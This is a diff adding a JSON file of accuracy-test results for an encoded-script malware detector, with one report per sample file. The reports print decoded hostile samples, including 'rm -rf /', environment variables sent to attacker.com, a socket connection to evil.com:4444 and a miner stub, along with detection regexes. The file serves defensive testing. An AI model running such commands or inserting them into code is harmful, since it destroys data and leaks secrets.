@@ -1,0 +1,82 @@
+{
+  "true_positives": {
+    "tp1_system_command.py": {
+      "detections": 1,
+      "output": "Encoded Script Detection Report\n================================\n\nTotal detections: 1\n\nDetection #1\nFile: accuracy_tests\\true_positives\\tp1_system_command.py\nLine: 3\nEncoding: Base64\nRisk Score: 25\nEncoded Content: b3Muc3lzdGVtKCdybSAtcmYgLycp\nDecoded Content: os.system('rm -rf /')\nSuspicious Patterns:\n  - system_calls: os\\.system\\s*\\(\n  - Contains valid Python code\n\n--------------------------------------------------\n\n\n\nReport saved to detection_report.txt\n"
+    },
+    "tp2_data_exfiltration.py": {
+      "detections": 1,
+      "output": "Encoded Script Detection Report\n================================\n\nTotal detections: 1\n\nDetection #1\nFile: accuracy_tests\\true_positives\\tp2_data_exfiltration.py\nLine: 3\nEncoding: Base64\nRisk Score: 40\nEncoded Content: CmltcG9ydCB1cmxsaWIucmVxdWVzdAppbXBvcnQgb3MKZGF0YS...\nDecoded Content: \nimport urllib.request\nimport os\ndata = str(os.environ)\nurllib.request.urlopen('http://attacker.com/...\nSuspicious Patterns:\n  - network_activity: urllib\\.request\n  - file_operations: open\\s*\\(\n  - Contains import statements\n  - Contains valid Python code\n\n--------------------------------------------------\n\n\n\nReport saved to detection_report.txt\n"
+    },
+    "tp3_hex_backdoor.py": {
+      "detections": 1,
+      "output": "Encoded Script Detection Report\n================================\n\nTotal detections: 1\n\nDetection #1\nFile: accuracy_tests\\true_positives\\tp3_hex_backdoor.py\nLine: 3\nEncoding: Hex (\\x)\nRisk Score: 30\nEncoded Content: \\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x73\\x6f\\x63\\x6b\\x65\\x...\nDecoded Content: import socket; s=socket.socket(); s.connect(('evil.com', 4444))\nSuspicious Patterns:\n  - network_activity: socket\\.\n  - Contains import statements\n  - Contains valid Python code\n\n--------------------------------------------------\n\n\n\nReport saved to detection_report.txt\n"
+    },
+    "tp4_file_deletion.py": {
+      "detections": 0,
+      "output": "No suspicious encoded content detected.\n\nReport saved to detection_report.txt\n"
+    },
+    "tp5_crypto_miner.py": {
+      "detections": 1,
+      "output": "Encoded Script Detection Report\n================================\n\nTotal detections: 1\n\nDetection #1\nFile: accuracy_tests\\true_positives\\tp5_crypto_miner.py\nLine: 4\nEncoding: Base64\nRisk Score: 30\nEncoded Content: CmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCB0aHJlYWRpbmcKZG...\nDecoded Content: \nimport subprocess\nimport threading\ndef mine(): subprocess.run(['python', '-c', 'while True: hash(\"b...\nSuspicious Patterns:\n  - system_calls: subprocess\\.\n  - Contains import statements\n  - Contains valid Python code\n\n--------------------------------------------------\n\n\n\nReport saved to detection_report.txt\n"
+    }
+  },
+  "true_negatives": {
+    "tn1_config_storage.py": {
+      "detections": 1,
+      "output": "Encoded Script Detection Report\n================================\n\nTotal detections: 1\n\nDetection #1\nFile: accuracy_tests\\true_negatives\\tn1_config_storage.py\nLine: 6\nEncoding: Base64\nRisk Score: 15\nEncoded Content: eyJkYXRhYmFzZV91cmwiOiAicG9zdGdyZXM6Ly9sb2NhbGhvc3...\nDecoded Content: {\"database_url\": \"postgres://localhost:5432/mydb\", \"debug\": false}\nSuspicious Patterns:\n  - Contains valid Python code\n\n--------------------------------------------------\n\n\n\nReport saved to detection_report.txt\n"
+    },
+    "tn2_image_data.py": {
+      "detections": 0,
+      "output": "No suspicious encoded content detected.\n\nReport saved to detection_report.txt\n"
+    },
+    "tn3_hex_identifiers.py": {
+      "detections": 0,
+      "output": "No suspicious encoded content detected.\n\nReport saved to detection_report.txt\n"
+    },
+    "tn4_url_encoding.py": {
+      "detections": 0,
+      "output": "No suspicious encoded content detected.\n\nReport saved to detection_report.txt\n"
+    },
+    "tn5_crypto_operations.py": {
+      "detections": 0,
+      "output": "No suspicious encoded content detected.\n\nReport saved to detection_report.txt\n"
+    }
+  },
+  "false_positive_risks": {
+    "fpr1_system_admin.py": {
+      "detections": 1,
+      "output": "Encoded Script Detection Report\n================================\n\nTotal detections: 1\n\nDetection #1\nFile: accuracy_tests\\false_positive_risks\\fpr1_system_admin.py\nLine: 9\nEncoding: Base64\nRisk Score: 30\nEncoded Content: CmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2VzcwoKZGVmIGdldF...\nDecoded Content: \nimport os\nimport subprocess\n\ndef get_system_info():\n    \"\"\"Get system information for monitoring\"\"\"...\nSuspicious Patterns:\n  - system_calls: subprocess\\.\n  - Contains import statements\n  - Contains valid Python code\n\n--------------------------------------------------\n\n\n\nReport saved to detection_report.txt\n"
+    },
+    "fpr2_dev_tools.py": {
+      "detections": 0,
+      "output": "No suspicious encoded content detected.\n\nReport saved to detection_report.txt\n"
+    },
+    "fpr3_file_processor.py": {
+      "detections": 0,
+      "output": "No suspicious encoded content detected.\n\nReport saved to detection_report.txt\n"
+    }
+  },
+  "false_negative_risks": {
+    "fnr1_double_encoded.py": {
+      "detections": 1,
+      "output": "Encoded Script Detection Report\n================================\n\nTotal detections: 1\n\nDetection #1\nFile: accuracy_tests\\false_negative_risks\\fnr1_double_encoded.py\nLine: 5\nEncoding: Base64\nRisk Score: 15\nEncoded Content: YjNNdWMzbHpkR1Z0S0NkbFkyaHZJR2hoWTJ0bFpDY3A=\nDecoded Content: b3Muc3lzdGVtKCdlY2hvIGhhY2tlZCcp\nSuspicious Patterns:\n  - Contains valid Python code\n\n--------------------------------------------------\n\n\n\nReport saved to detection_report.txt\n"
+    },
+    "fnr2_split_payload.py": {
+      "detections": 1,
+      "output": "Encoded Script Detection Report\n================================\n\nTotal detections: 1\n\nDetection #1\nFile: accuracy_tests\\false_negative_risks\\fnr2_split_payload.py\nLine: 5\nEncoding: Base64\nRisk Score: 10\nEncoded Content: b3Muc3lzdGVtKCdtYWxp\nDecoded Content: os.system('mali\nSuspicious Patterns:\n  - system_calls: os\\.system\\s*\\(\n\n--------------------------------------------------\n\n\n\nReport saved to detection_report.txt\n"
+    },
+    "fnr3_custom_encoding.py": {
+      "detections": 0,
+      "output": "No suspicious encoded content detected.\n\nReport saved to detection_report.txt\n"
+    },
+    "fnr4_steganography.py": {
+      "detections": 0,
+      "output": "No suspicious encoded content detected.\n\nReport saved to detection_report.txt\n"
+    },
+    "fnr5_delayed_execution.py": {
+      "detections": 1,
+      "output": "Encoded Script Detection Report\n================================\n\nTotal detections: 1\n\nDetection #1\nFile: accuracy_tests\\false_negative_risks\\fnr5_delayed_execution.py\nLine: 7\nEncoding: Base64\nRisk Score: 30\nEncoded Content: CmltcG9ydCB0aW1lCmltcG9ydCBvcwp0aW1lLnNsZWVwKDAuMS...\nDecoded Content: \nimport time\nimport os\ntime.sleep(0.1)  # Short delay\nos.system('echo \"delayed attack\"')\n\nSuspicious Patterns:\n  - system_calls: os\\.system\\s*\\(\n  - Contains import statements\n  - Contains valid Python code\n\n--------------------------------------------------\n\n\n\nReport saved to detection_report.txt\n"
+    }
+  }
+}
